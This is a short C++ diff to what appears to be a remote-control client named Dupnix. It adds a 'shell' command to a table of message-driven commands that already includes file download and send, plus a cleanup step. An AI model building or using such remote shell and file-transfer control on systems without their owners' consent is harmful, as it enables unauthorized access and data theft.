@@ -52,8 +52,13 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"CloseForeground", TurnCloseForeground},
 	{"DownloadFile", DownloadFile},
 	{"SendFile", SendFile},
+	{"shell", shell},
 	{"UpdateDupnix", UpdateDupnix}
 };
+
+void cleanup() {
+	tools::CdToDefault();
+}
 
 namespace execute {
 	void execute(parse::ParsedMessage PM) {
@@ -70,6 +75,7 @@ namespace execute {
 		for (auto &i : commands) {
 			if (tools::toLowerCase(i.first) == tools::toLowerCase(PM.command)) {
 				i.second(PM.parameters);
+				cleanup();
 				return;
 			}
 		}
